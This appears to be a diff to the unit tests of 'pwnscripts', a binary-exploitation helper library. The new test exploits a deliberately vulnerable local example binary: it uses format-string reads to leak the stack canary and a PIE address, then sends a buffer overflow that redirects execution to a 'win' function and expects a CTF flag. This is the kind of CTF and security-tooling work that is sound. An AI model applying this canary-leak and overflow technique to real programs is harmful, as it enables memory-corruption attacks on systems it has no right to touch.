@@ -1,11 +1,14 @@
+'''A number of tests for pwnscripts.
+Some of these test cases are "probabilistic", in that they
+can arbitrarily fail or pass depending on <undetermined factor>.
+'''
 import unittest as ut
 from pwnscripts import *
 
 class BinTests(ut.TestCase):
-    def test_common_sense(self):
+    def test_A_common_sense(self):
         # check base necessities
-        assert not path.isfile('1.out')
-        assert not path.isfile('2.out')
+        for i in range(1,3): assert not path.isfile('%d.out'%i)
         assert path.isfile('/usr/bin/gcc')
     
     def test_printf_buffer_bruteforce(self):
@@ -79,6 +82,37 @@ class BinTests(ut.TestCase):
             
         finally:
             system('rm 2.out')
+    def test_a_printf_alt_bruteforce(self):
+        print()
+        if is_wsl():
+            log.info('Skipping this test due to wsl')
+            return
+        try:
+            system('./examples/3.c')
+            with attrib_set_to(context, 'log_level', 'warn') as _:
+                context.binary = '3.out'    # quieten this part
+            main = context.binary.symbols['main']
+            win = context.binary.symbols['win']
 
+            @context.quiet
+            def printf(l:str):
+                r = context.binary.process()
+                r.send(l)
+                return r.recvline()
+
+            canary_off = fsb.find_offset.canary(printf)
+            main_off = fsb.find_offset.PIE(printf, regex=main%0x100)
+            buffer = fsb.find_offset.buffer(printf, maxlen=63)
+
+            r = context.binary.process()
+            r.sendline('%{}$p,%{}$p'.format(canary_off, main_off))
+            canary, pie_leak = extract_all_hex(r.recvline())
+            payload = b'A'*(canary_off-buffer)*context.bytes
+            payload+= pack(canary).ljust(2*context.bytes)   # unfortunate magic number
+            r.sendline(payload + pack(pie_leak-main+win))
+            self.assertEqual(r.recvline().strip(), b'flag{NiceOne}')
+        finally:
+            system('rm 3.out')
+    # TODO: tests for ROP
 if __name__ == '__main__':
     ut.main()
